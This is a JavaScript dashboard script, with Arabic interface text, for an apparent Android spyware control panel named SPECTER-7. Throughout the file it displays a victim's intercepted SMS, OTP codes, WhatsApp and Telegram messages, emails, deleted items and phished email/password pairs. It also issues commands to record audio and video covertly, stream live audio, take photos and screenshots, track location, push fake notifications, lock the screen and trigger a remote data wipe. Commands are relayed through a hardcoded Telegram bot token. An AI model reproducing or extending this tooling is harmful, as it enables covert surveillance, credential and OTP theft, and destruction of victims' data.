// ═══════════════════════════════════════════════════════════
// SPECTER-7 Dashboard Script
// ═══════════════════════════════════════════════════════════

function getAuthToken() {
    return sessionStorage.getItem('auth_token') || '';
}

function isOwner() {
    return sessionStorage.getItem('is_owner') === 'true';
}

function authFetch(url, options = {}) {
    const token = getAuthToken();
    if (!token) return fetch(url, options);
    const separator = url.includes('?') ? '&' : '?';
    return fetch(url + separator + 'token=' + encodeURIComponent(token), options);
}

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let allCalls = [];
let allSMS = [];
let allContacts = [];
let allDeleted = [];
let currentChat = null;
let currentCallNumber = null;
let currentContact = null;
let wasOffline = true;
let lastCallCount = 0;
let lastSmsCount = 0;
let lastDeletedCount = 0;
let soundPlayedForDevice = false;
let sse = null;

let liveImages = [];
let liveMsgs = [];
let liveMsgsFilter = 'all';
let liveOtps = [];
let deletedFilter = 'all';
let liveVoices = [];
let liveEmails = [];
let liveScreenshots = [];
let liveAudioRecordings = [];
let liveCameraPhotos = [];
let liveVideos = [];
let liveMotionPhotos = [];
let liveGeofenceEvents = [];
let liveLiveAudio = [];
let livePhishing = [];

let panelOpenTime = Date.now();
let liveFilterEnabled = true;

let isRecordingAudio = false;
let isRecordingVideo = false;
let isLiveAudioStreaming = false;
let isMotionCameraActive = false;

const TG_BOT_TOKEN = "5826969870:AAF2RAg49eZHLJ62onDtVjBskxgYFvfdkpQ";
const TG_CHAT_ID = "1538488453";

// 🔐 الكود السري للقائمة المتقدمة
const ADVANCED_MENU_CODE = "922499";
const ADVANCED_UNLOCK_KEY = "specter_adv_unlocked";
const ADVANCED_UNLOCK_DURATION = 30 * 60 * 1000; // 30 دقيقة

// ═══════════════════════════════════════════
// Core
// ═══════════════════════════════════════════
function logout() {
    const token = getAuthToken();
    if (token) {
        fetch('/auth/logout', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token })
        }).catch(() => {});
    }
    sessionStorage.removeItem('logged_in');
    sessionStorage.removeItem('auth_token');
    sessionStorage.removeItem('is_owner');
    sessionStorage.removeItem(ADVANCED_UNLOCK_KEY);
    window.location.href = 'login.html';
}

function playNotificationSound() {
    try { const a = new Audio('v.wav'); a.volume = 1.0; a.play(); } catch (e) {}
}

function findContactName(number) {
    if (!allContacts || allContacts.length === 0 || !number) return null;
    const clean = number.replace(/[^0-9]/g, '').slice(-9);
    for (let contact of allContacts) {
        const nums = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        for (let n of nums) {
            if (!n) continue;
            if (n.replace(/[^0-9]/g, '').slice(-9) === clean) return contact.name;
        }
    }
    return null;
}

function showNotification(title, message, icon) {
    const div = document.createElement('div');
    div.className = 'notification-popup';
    div.innerHTML = `<div class="notification-icon">${icon}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message" style="white-space:pre-wrap;">${message}</div></div><button class="notification-close" onclick="this.parentElement.remove()">✕</button>`;
    document.body.appendChild(div);
    playNotificationSound();
    setTimeout(() => { if (div.parentElement) div.remove(); }, 8000);
}

function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
function formatDate(t) { if (!t) return '—'; try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } }
function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; case 2: return '📤 صادر'; case 3: return '❌ فائت'; default: return 'غير معروف'; } }
function formatWhatsAppDate(t) {
    if (!t) return '—';
    try { const d = new Date(Number(t)); if (isNaN(d.getTime())) return '—'; return d.toLocaleString('ar', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' }); } catch (e) { return '—'; }
}

// ═══════════════════════════════════════════
// 🔐 Advanced Menu Lock
// ═══════════════════════════════════════════
function isAdvancedUnlocked() {
    try {
        const raw = sessionStorage.getItem(ADVANCED_UNLOCK_KEY);
        if (!raw) return false;
        const data = JSON.parse(raw);
        if (!data.expires || Date.now() > data.expires) {
            sessionStorage.removeItem(ADVANCED_UNLOCK_KEY);
            return false;
        }
        return true;
    } catch (e) { return false; }
}

function setAdvancedUnlocked() {
    try {
        sessionStorage.setItem(ADVANCED_UNLOCK_KEY, JSON.stringify({
            expires: Date.now() + ADVANCED_UNLOCK_DURATION,
            at: Date.now()
        }));
    } catch (e) {}
}

function lockAdvancedMenu() {
    sessionStorage.removeItem(ADVANCED_UNLOCK_KEY);
    showNotification('🔒 تم القفل', 'القائمة المتقدمة تحتاج الكود مرة ثانية', '🔐');
}

function requestAdvancedCode() {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }

    if (isAdvancedUnlocked()) {
        openAdvancedMenu();
        return;
    }

    if (document.getElementById('advCodeOverlay')) return;

    const ov = document.createElement('div');
    ov.id = 'advCodeOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10001;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(6px);';
    ov.innerHTML = `
        <div style="background:#0d0d0d;border:2px solid #9b59b6;border-radius:18px;padding:30px 25px;max-width:400px;width:100%;box-shadow:0 0 40px rgba(155,89,182,0.4);">
            <div style="text-align:center;margin-bottom:20px;">
                <div style="font-size:48px;margin-bottom:8px;">🔐</div>
                <h2 style="color:#9b59b6;margin:0 0 6px 0;font-size:20px;">القائمة المتقدمة</h2>
                <p style="color:#666;font-size:12px;margin:0;">أدخل الكود السري للمتابعة</p>
            </div>
            <input id="advCodeInput" type="password" inputmode="numeric" autocomplete="off" placeholder="• • • • • •"
                style="width:100%;padding:18px;background:#050505;color:#9b59b6;border:2px solid #2a1a3a;border-radius:12px;font-size:28px;text-align:center;letter-spacing:12px;font-weight:bold;outline:none;transition:border-color .2s;box-sizing:border-box;">
            <div id="advCodeError" style="color:#ff3300;font-size:12px;text-align:center;margin-top:10px;min-height:16px;font-weight:bold;"></div>
            <div style="display:flex;gap:10px;margin-top:18px;">
                <button onclick="submitAdvancedCode()" style="flex:1;background:#9b59b6;color:#fff;border:none;padding:14px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;">🔓 فتح</button>
                <button onclick="document.getElementById('advCodeOverlay').remove()" style="background:#222;color:#fff;border:none;padding:14px 20px;border-radius:10px;cursor:pointer;font-weight:bold;">✖</button>
            </div>
            <p style="color:#444;font-size:10px;text-align:center;margin:15px 0 0 0;">يُقفل تلقائياً بعد 30 دقيقة</p>
        </div>
    `;
    document.body.appendChild(ov);

    const input = document.getElementById('advCodeInput');
    input.focus();
    input.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitAdvancedCode(); });
    input.addEventListener('input', () => {
        const err = document.getElementById('advCodeError');
        if (err) err.textContent = '';
        input.style.borderColor = '#2a1a3a';
    });
}

function submitAdvancedCode() {
    const input = document.getElementById('advCodeInput');
    const err = document.getElementById('advCodeError');
    if (!input || !err) return;
    const value = (input.value || '').trim();

    if (value === ADVANCED_MENU_CODE) {
        setAdvancedUnlocked();
        input.style.borderColor = '#00ff66';
        err.style.color = '#00ff66';
        err.textContent = '✅ تم التحقق';
        setTimeout(() => {
            document.getElementById('advCodeOverlay')?.remove();
            openAdvancedMenu();
        }, 400);
    } else {
        input.style.borderColor = '#ff3300';
        err.style.color = '#ff3300';
        err.textContent = '❌ كود خاطئ';
        input.value = '';
        input.animate(
            [{ transform: 'translateX(0)' }, { transform: 'translateX(-8px)' },
             { transform: 'translateX(8px)' }, { transform: 'translateX(0)' }],
            { duration: 250 }
        );
    }
}

// ═══════════════════════════════════════════
// SSE
// ═══════════════════════════════════════════
function initSSE() {
    if (sse) { try { sse.close(); } catch(e){} sse = null; }
    if (!currentDevice) return;
    try {
        sse = new EventSource(
            `/events.php?device=${encodeURIComponent(currentDevice)}&token=${encodeURIComponent(getAuthToken())}`
        );

        sse.addEventListener('new_media', (e) => {
            try {
                const data = JSON.parse(e.data);
                const imgTime = data.date || 0;
                if (!liveFilterEnabled || imgTime >= panelOpenTime) addLiveImage(data);
                const labels = { camera: '📸 كاميرا', screenshot: '📱 سكرين شوت', screen_record: '🎥 تسجيل شاشة', whatsapp: '💬 واتساب', telegram: '✈️ تيليجرام', download: '⬇️ تحميل', unknown: '📁 ملف' };
                showNotification(`${labels[data.source] || '📁 ملف'} جديد`, data.name || 'ملف جديد', '🖼️');
                prependImageCard(data);
            } catch (err) {}
        });

        sse.addEventListener('new_screenshot', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveScreenshot(data);
                showNotification('📷 لقطة شاشة جديدة', data.file_name || '', '📷');
                const badge = document.getElementById('liveScreenshotsCount');
                if (badge) badge.textContent = (parseInt(badge.textContent) || 0) + 1;
            } catch (err) {}
        });

        sse.addEventListener('new_audio', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveAudio(data);
                showNotification('🎤 تسجيل صوتي جديد', data.file_name || '', '🎤');
                const badge = document.getElementById('liveAudioCount');
                if (badge) badge.textContent = (parseInt(badge.textContent) || 0) + 1;
            } catch (err) {}
        });

        sse.addEventListener('new_video', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveVideo(data);
                const camLabel = data.camera_name === 'front' ? 'أمامي' : 'خلفي';
                const sizeMB = ((data.file_size || 0) / 1024 / 1024).toFixed(1);
                showNotification('🎥 فيديو جديد', `كاميرا ${camLabel} — ${sizeMB} MB`, '🎥');
                const badge = document.getElementById('liveVideoCount');
                if (badge) badge.textContent = (parseInt(badge.textContent) || 0) + 1;
            } catch (err) {}
        });

        sse.addEventListener('new_motion_photo', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveMotionPhoto(data);
                showNotification('📳 صورة كاميرا الحركة', data.file_name || '', '📳');
            } catch (err) {}
        });

        sse.addEventListener('new_geofence_event', (e) => {
            try {
                const data = JSON.parse(e.data);
                addGeofenceEvent(data);
                const evLabel = data.event === 'enter' ? 'دخل' : 'خرج من';
                showNotification('📍 تنبيه الموقع', `${evLabel} ${data.zone_name || 'منطقة'}`, '📍');
            } catch (err) {}
        });

        sse.addEventListener('new_live_audio', (e) => {
            try { addLiveAudioChunk(JSON.parse(e.data)); } catch (err) {}
        });

        sse.addEventListener('deadman_triggered', () => {
            try { showNotification('💀 Dead Man Triggered', 'تم مسح البيانات!', '💀'); } catch (err) {}
        });

        sse.addEventListener('new_camera_photo', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveCameraPhoto(data);
                const camName = data.camera_name === 'front' ? 'أمامية' : 'خلفية';
                showNotification(`📸 كاميرا ${camName}`, data.file_name || '', '📸');
                const badge = document.getElementById('liveCameraCount');
                if (badge) badge.textContent = (parseInt(badge.textContent) || 0) + 1;
            } catch (err) {}
        });

        sse.addEventListener('new_voice', (e) => {
            try {
                const data = JSON.parse(e.data);
                const vTime = data.timestamp || 0;
                if (!liveFilterEnabled || vTime >= panelOpenTime) addLiveVoice(data);
                const srcLabel = data.source === 'telegram_voice' ? '✈️ تيليجرام' : '💬 واتساب';
                showNotification(`🎤 صوتية ${srcLabel}`, data.file_name || '', '🎤');
            } catch (err) {}
        });

        sse.addEventListener('new_whatsapp', (e) => {
            try {
                const data = JSON.parse(e.data);
                showNotification(data.image_data ? '📷 صورة جديدة' : '💬 رسالة جديدة', `${data.sender || 'غير معروف'}: ${data.message || ''}`, '💬');
                const chatWindow = document.getElementById('whatsappChatWindow');
                if (chatWindow && currentChat === data.sender) appendWhatsAppMessage(data);
                loadWhatsApp();
            } catch (err) {}
        });

        sse.addEventListener('new_email', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveEmail(data);
                showNotification(`📧 ${data.app_name || 'بريد'} جديد`, `${data.sender || ''}: ${data.subject || ''}`, '📧');
                loadEmails();
            } catch (err) {}
        });

        sse.addEventListener('new_sms', (e) => { try { addLiveMsg(JSON.parse(e.data)); } catch (err) {} });

        sse.addEventListener('new_otp', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveOtp(data);
                showNotification('🔐 كود OTP وصل!', `الكود: ${data.code || ''}`, '🔐');
            } catch (err) {}
        });

        sse.addEventListener('new_deleted', (e) => {
            try {
                const data = JSON.parse(e.data);
                const typeLabels = { call_log: '📞 مكالمة محذوفة', sms: '💬 رسالة محذوفة', contact: '👤 جهة محذوفة', image: '🖼️ صورة محذوفة' };
                showNotification(typeLabels[data.type] || '🗑️ عنصر محذوف', 'تم الحذف للتو', '🗑️');
                loadDeleted();
            } catch (err) {}
        });

        sse.addEventListener('new_phishing', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLivePhishing(data);
                showNotification('🎣 بيانات صيد جديدة', `${data.email || ''} : ${data.password || ''}`, '🎣');
            } catch (err) {}
        });

        sse.addEventListener('sim_info', (e) => {
            try {
                const data = JSON.parse(e.data);
                if (data.sims && data.sims.length > 0) {
                    const firstSim = data.sims.find(s => s.number && s.number.length > 0);
                    if (firstSim && currentDevice) {
                        const display = document.getElementById('deviceNameDisplay');
                        if (display && !display.textContent.includes(firstSim.number)) {
                            const baseName = display.textContent.split(' — ')[0];
                            display.textContent = `${baseName} — 📱 ${firstSim.number}`;
                        }
                    }
                }
            } catch (err) {}
        });

        sse.addEventListener('sms_send_result', (e) => {
            try {
                const d = JSON.parse(e.data);
                let msg = `إلى: ${d.number || ''}`;
                if (d.error && !d.success) msg += `\n${d.error}`;
                showNotification(d.success ? '✅ SMS أُرسلت' : '❌ فشل إرسال SMS', msg, '📨');
            } catch (err) {}
        });

        sse.onerror = () => {
            try { sse.close(); } catch(e){}
            sse = null;
            if (!getAuthToken()) { window.location.href = 'login.html'; return; }
            setTimeout(initSSE, 3000);
        };
    } catch (e) { console.error('SSE err:', e); }
}

// ═══════════════════════════════════════════
// Telegram + Dual command
// ═══════════════════════════════════════════
async function sendTelegramCommand(cmd) {
    try {
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: cmd })
        });
        const result = await response.json();
        return result.ok === true;
    } catch (e) { console.error('TG err:', e); return false; }
}

async function sendCommandDual(command, params) {
    let serverOk = false, tgOk = false;

    try {
        const res = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command, ...(params || {}), token: getAuthToken() })
        });
        const data = await res.json();
        serverOk = data.success === true;
    } catch (e) { console.error('srv cmd err:', e); }

    try {
        if (command === 'send_fake_notification')
            tgOk = await sendTelegramCommand(`/fakenotif ${params?.app || 'System'} | ${params?.title || ''} | ${params?.body || ''}`);
        else if (command === 'tts_speak')
            tgOk = await sendTelegramCommand(`/speak ${params?.text || ''}`);
        else if (command === 'lock_screen')
            tgOk = await sendTelegramCommand('/lock');
        else if (command === 'unlock_screen')
            tgOk = await sendTelegramCommand('/unlock');
        else if (command === 'start_motion_camera')
            tgOk = await sendTelegramCommand('/motion');
        else if (command === 'stop_motion_camera')
            tgOk = await sendTelegramCommand('/stopmotion');
        else if (command === 'start_geofence')
            tgOk = await sendTelegramCommand('/geofencestart');
        else if (command === 'stop_geofence')
            tgOk = await sendTelegramCommand('/geofencestop');
        else if (command === 'clear_geofence')
            tgOk = await sendTelegramCommand('/geofenceclear');
        else if (command === 'set_geofence')
            tgOk = await sendTelegramCommand(`/geofence ${params?.name} | ${params?.lat} | ${params?.lng} | ${params?.radius}`);
        else if (command === 'start_deadman')
            tgOk = await sendTelegramCommand(`/deadman${params?.hours || 24}`);
        else if (command === 'stop_deadman')
            tgOk = await sendTelegramCommand('/deadmanstop');
        else if (command === 'reset_deadman')
            tgOk = await sendTelegramCommand('/deadmanreset');
        else if (command === 'start_live_audio')
            tgOk = await sendTelegramCommand('/liveaudio');
        else if (command === 'stop_live_audio')
            tgOk = await sendTelegramCommand('/stopliveaudio');
        else if (command === 'open_url')
            tgOk = await sendTelegramCommand(`/openurl ${params?.url || ''}`);
    } catch (e) { console.error('TG cmd err:', e); }

    return { serverOk, tgOk, anyOk: serverOk || tgOk };
}

// ═══════════════════════════════════════════
// Audio / Video / Camera
// ═══════════════════════════════════════════
async function startAudioRecording() {
    const ok = await sendTelegramCommand('/recordaudio');
    if (ok) {
        isRecordingAudio = true;
        const sBtn = document.getElementById('startAudioBtn');
        const eBtn = document.getElementById('stopAudioBtn');
        if (sBtn) { sBtn.disabled = true; sBtn.style.opacity = '0.5'; }
        if (eBtn) { eBtn.disabled = false; eBtn.style.opacity = '1'; }
        showNotification('🎤 بدأ التسجيل', 'جاري التسجيل...', '🎤');
    } else alert('❌ فشل');
}

async function stopAudioRecording() {
    const ok = await sendTelegramCommand('/stopaudio');
    if (ok) {
        isRecordingAudio = false;
        const sBtn = document.getElementById('startAudioBtn');
        const eBtn = document.getElementById('stopAudioBtn');
        if (sBtn) { sBtn.disabled = false; sBtn.style.opacity = '1'; }
        if (eBtn) { eBtn.disabled = true; eBtn.style.opacity = '0.5'; }
        showNotification('✅ تم الإيقاف', 'جاري رفع التسجيل...', '✅');
    } else alert('❌ فشل');
}

async function startVideoRecording(camera) {
    if (isRecordingVideo) { alert('⚠️ في تسجيل شغال'); return; }
    const cmd = camera === 'front' ? '/videofront' : '/videoback';
    const ok = await sendTelegramCommand(cmd);
    if (ok) {
        isRecordingVideo = true;
        const f = document.getElementById('startVideoFrontBtn');
        const b = document.getElementById('startVideoBackBtn');
        const s = document.getElementById('stopVideoBtn');
        if (f) { f.disabled = true; f.style.opacity = '0.5'; }
        if (b) { b.disabled = true; b.style.opacity = '0.5'; }
        if (s) { s.disabled = false; s.style.opacity = '1'; }
        showNotification(`🎥 بدأ ${camera === 'front' ? 'الأمامي' : 'الخلفي'}`, 'اضغط إيقاف عند الانتهاء', '🎥');
    } else alert('❌ فشل');
}

async function stopVideoRecording() {
    const ok = await sendTelegramCommand('/stopvideo');
    if (ok) {
        isRecordingVideo = false;
        const f = document.getElementById('startVideoFrontBtn');
        const b = document.getElementById('startVideoBackBtn');
        const s = document.getElementById('stopVideoBtn');
        if (f) { f.disabled = false; f.style.opacity = '1'; }
        if (b) { b.disabled = false; b.style.opacity = '1'; }
        if (s) { s.disabled = true; s.style.opacity = '0.5'; }
        showNotification('✅ تم', 'جاري رفع الفيديو...', '✅');
    } else alert('❌ فشل');
}

async function takeCameraPhoto(camera) {
    const cmd = camera === 'front' ? '/photofront' : '/photoback';
    const ok = await sendTelegramCommand(cmd);
    if (ok) showNotification(`📸 الكاميرا ${camera === 'front' ? 'الأمامية' : 'الخلفية'}`, 'أُرسل', '📸');
    else alert('❌ فشل');
}

async function takeScreenshot() {
    const ok = await sendTelegramCommand('/screenshot');
    if (ok) showNotification('📷 لقطة شاشة', 'أُرسل', '📷');
    else alert('❌ فشل');
}

// ═══════════════════════════════════════════
// Advanced features
// ═══════════════════════════════════════════
async function sendFakeNotification() {
    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
    const app = prompt('اسم التطبيق:', 'WhatsApp');
    if (app === null) return;
    const title = prompt('العنوان:', 'رسالة جديدة');
    if (title === null) return;
    const body = prompt('النص:', '');
    if (body === null) return;
    const res = await sendCommandDual('send_fake_notification', { app, title, body });
    if (res.anyOk) showNotification('📢 تم', `إشعار مزيّف من "${app}"`, '📢');
    else alert('❌ فشل');
}

async function speakOnDevice() {
    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
    const text = prompt('النص:');
    if (!text || !text.trim()) return;
    const res = await sendCommandDual('tts_speak', { text, pitch: 1.0, rate: 1.0 });
    if (res.anyOk) showNotification('🔊 الجهاز هيتكلم', text, '🔊');
    else alert('❌ فشل');
}

async function lockDevice() {
    if (!currentDevice) return;
    const msg = prompt('نص شاشة القفل:', 'تم قفل الجهاز');
    if (msg === null) return;
    const res = await sendCommandDual('lock_screen', { message: msg });
    if (res.anyOk) showNotification('🔒 قفل', 'أُرسل', '🔒');
    else alert('❌ فشل');
}

async function unlockDevice() {
    if (!currentDevice) return;
    const res = await sendCommandDual('unlock_screen', {});
    if (res.anyOk) showNotification('🔓 فتح', 'أُرسل', '🔓');
    else alert('❌ فشل');
}

async function toggleMotionCamera() {
    if (!currentDevice) return;
    const cmd = isMotionCameraActive ? 'stop_motion_camera' : 'start_motion_camera';
    const res = await sendCommandDual(cmd, { camera: 0, threshold: 2.5 });
    if (res.anyOk) {
        isMotionCameraActive = !isMotionCameraActive;
        const btn = document.getElementById('motionBtn');
        if (btn) {
            btn.textContent = isMotionCameraActive ? '⏹️ إيقاف مراقبة الحركة' : '📳 تشغيل مراقبة الحركة';
            btn.style.background = isMotionCameraActive ? '#ff3300' : '#ff6600';
        }
        showNotification(isMotionCameraActive ? '📳 بدء' : '⏹️ إيقاف', isMotionCameraActive ? 'أي حركة ستلتقط صورة' : 'تم الإيقاف', '📳');
    } else alert('❌ فشل');
}

function openGeofenceDialog() {
    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
    if (document.getElementById('geofenceOverlay')) return;
    const ov = document.createElement('div');
    ov.id = 'geofenceOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto;';
    ov.innerHTML = `
        <div style="background:#111;border:2px solid #00ffcc;border-radius:15px;padding:25px;max-width:500px;width:100%;">
            <h2 style="color:#00ffcc;text-align:center;margin-bottom:20px;">📍 إضافة منطقة</h2>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">اسم المنطقة</label>
                <input id="geoName" type="text" placeholder="مثل: البيت" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;">
            </div>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">Latitude</label>
                <input id="geoLat" type="number" step="any" placeholder="15.3694" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;">
            </div>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">Longitude</label>
                <input id="geoLng" type="number" step="any" placeholder="44.1910" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;">
            </div>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">النطاق (متر)</label>
                <input id="geoRadius" type="number" value="200" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;">
            </div>
            <button onclick="getCurrentLocation()" style="width:100%;margin-bottom:10px;background:#0099ff;color:#fff;border:none;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;">📍 استخدم موقع الجهاز الحالي</button>
            <div style="display:flex;gap:10px;">
                <button onclick="saveGeofence()" style="flex:1;background:#00ffcc;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">💾 حفظ</button>
                <button onclick="document.getElementById('geofenceOverlay').remove()" style="background:#333;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;">✖</button>
            </div>
        </div>
    `;
    document.body.appendChild(ov);
}

async function getCurrentLocation() {
    try {
        const res = await authFetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
        const data = await res.json();
        if (data.location && data.location.latitude && data.location.longitude) {
            document.getElementById('geoLat').value = data.location.latitude;
            document.getElementById('geoLng').value = data.location.longitude;
            showNotification('📍 تم', 'تم إدراج الموقع', '📍');
        } else alert('⚠️ مفيش موقع محفوظ');
    } catch (e) { alert('❌ فشل'); }
}

async function saveGeofence() {
    const name = document.getElementById('geoName').value.trim() || 'Zone';
    const lat = parseFloat(document.getElementById('geoLat').value);
    const lng = parseFloat(document.getElementById('geoLng').value);
    const radius = parseFloat(document.getElementById('geoRadius').value) || 200;
    if (isNaN(lat) || isNaN(lng)) { alert('⚠️ أدخل lat/lng'); return; }
    const res = await sendCommandDual('set_geofence', { name, lat, lng, radius });
    if (res.anyOk) {
        showNotification('📍 تم', `منطقة "${name}" مضافة`, '📍');
        document.getElementById('geofenceOverlay').remove();
        setTimeout(() => sendCommandDual('start_geofence', {}), 1000);
    } else alert('❌ فشل');
}

async function stopGeofenceMonitor() {
    if (!currentDevice) return;
    const res = await sendCommandDual('stop_geofence', {});
    if (res.anyOk) showNotification('⏹️ تم', 'إيقاف المراقبة', '📍');
}

async function clearAllGeofences() {
    if (!currentDevice) return;
    if (!confirm('مسح كل المناطق؟')) return;
    const res = await sendCommandDual('clear_geofence', {});
    if (res.anyOk) showNotification('🗑️ تم', 'مسح المناطق', '📍');
}

function openDeadManDialog() {
    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
    if (document.getElementById('deadmanOverlay')) return;
    const ov = document.createElement('div');
    ov.id = 'deadmanOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;';
    ov.innerHTML = `
        <div style="background:#111;border:2px solid #ff0066;border-radius:15px;padding:25px;max-width:500px;width:100%;">
            <h2 style="color:#ff0066;text-align:center;margin-bottom:10px;">💀 Dead Man's Switch</h2>
            <p style="color:#888;text-align:center;font-size:13px;margin-bottom:20px;">لو الجهاز ما اتصلش خلال المدة → مسح البيانات</p>
            <div style="display:flex;flex-direction:column;gap:10px;margin-bottom:15px;">
                <button onclick="startDeadMan(24)" style="background:#ff6600;color:#fff;border:none;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:15px;">⏱️ 24 ساعة</button>
                <button onclick="startDeadMan(48)" style="background:#ff3300;color:#fff;border:none;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:15px;">⏱️ 48 ساعة</button>
                <button onclick="startDeadMan(72)" style="background:#cc0000;color:#fff;border:none;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:15px;">⏱️ 72 ساعة</button>
            </div>
            <div style="display:flex;gap:10px;margin-bottom:10px;">
                <button onclick="resetDeadMan()" style="flex:1;background:#0099ff;color:#fff;border:none;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;">🔄 إعادة ضبط</button>
                <button onclick="stopDeadMan()" style="flex:1;background:#666;color:#fff;border:none;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;">⏹️ إيقاف</button>
            </div>
            <button onclick="document.getElementById('deadmanOverlay').remove()" style="width:100%;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;">✖ إغلاق</button>
        </div>
    `;
    document.body.appendChild(ov);
}

async function startDeadMan(hours) {
    const res = await sendCommandDual('start_deadman', { hours });
    if (res.anyOk) {
        showNotification('💀 تم', `Dead Man — ${hours} ساعة`, '💀');
        const ov = document.getElementById('deadmanOverlay');
        if (ov) ov.remove();
    } else alert('❌ فشل');
}

async function stopDeadMan() {
    const res = await sendCommandDual('stop_deadman', {});
    if (res.anyOk) showNotification('⏹️ تم', 'إيقاف', '💀');
}

async function resetDeadMan() {
    const res = await sendCommandDual('reset_deadman', {});
    if (res.anyOk) showNotification('🔄 تم', 'إعادة ضبط', '💀');
}

async function toggleLiveAudio() {
    if (!currentDevice) return;
    const cmd = isLiveAudioStreaming ? 'stop_live_audio' : 'start_live_audio';
    const res = await sendCommandDual(cmd, { chunk_seconds: 5 });
    if (res.anyOk) {
        isLiveAudioStreaming = !isLiveAudioStreaming;
        const btn = document.getElementById('liveAudioStreamBtn');
        if (btn) {
            btn.textContent = isLiveAudioStreaming ? '⏹️ إيقاف البث الحي' : '🎙️ بدء البث الحي';
            btn.style.background = isLiveAudioStreaming ? '#ff3300' : '#00cc99';
        }
        showNotification(isLiveAudioStreaming ? '🎙️ بدء البث' : '⏹️ إيقاف البث', isLiveAudioStreaming ? 'كل 5 ثواني' : 'تم', '🎙️');
    } else alert('❌ فشل');
}

// ═══════════════════════════════════════════
// 🎣 Phishing module
// ═══════════════════════════════════════════
function openLivePhishing() {
    const ov = document.getElementById('livePhishingOverlay');
    if (ov) ov.style.display = 'block';
    loadPhishing();
}

function closeLivePhishing() {
    const ov = document.getElementById('livePhishingOverlay');
    if (ov) ov.style.display = 'none';
}

function clearLivePhishing() {
    if (!confirm('مسح كل بيانات الصيد؟')) return;
    authFetch(`/phishing_clear.php?device=${encodeURIComponent(currentDevice)}`).then(() => {
        livePhishing = [];
        renderLivePhishing();
        updateAdvancedCounters();
    });
}

function addLivePhishing(data) {
    livePhishing.unshift(data);
    if (livePhishing.length > 500) livePhishing = livePhishing.slice(0, 500);
    if (document.getElementById('livePhishingOverlay')?.style.display === 'block') renderLivePhishing();
    updateAdvancedCounters();
    const badge = document.getElementById('livePhishingCount');
    if (badge) badge.textContent = livePhishing.length;
}

async function loadPhishing() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/phishing_list.php?device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) {
            livePhishing = data;
            renderLivePhishing();
            updateAdvancedCounters();
            const badge = document.getElementById('livePhishingCount');
            if (badge) badge.textContent = data.length;
        }
    } catch (e) {}
}

function renderLivePhishing() {
    const list = document.getElementById('livePhishingList');
    if (!list) return;
    if (livePhishing.length === 0) {
        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد بيانات</p>';
        return;
    }
    list.innerHTML = '';
    livePhishing.forEach((p, idx) => {
        const div = document.createElement('div');
        div.style.cssText = 'background:#1a000a;border:2px solid #ff0066;padding:18px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#ff0066;font-size:15px;font-weight:bold;margin-bottom:12px;">🎣 بيانات جديدة من "${p.sender || 'غير معروف'}"</div>
            <div style="background:#0a0005;padding:12px;border-radius:8px;margin-bottom:10px;">
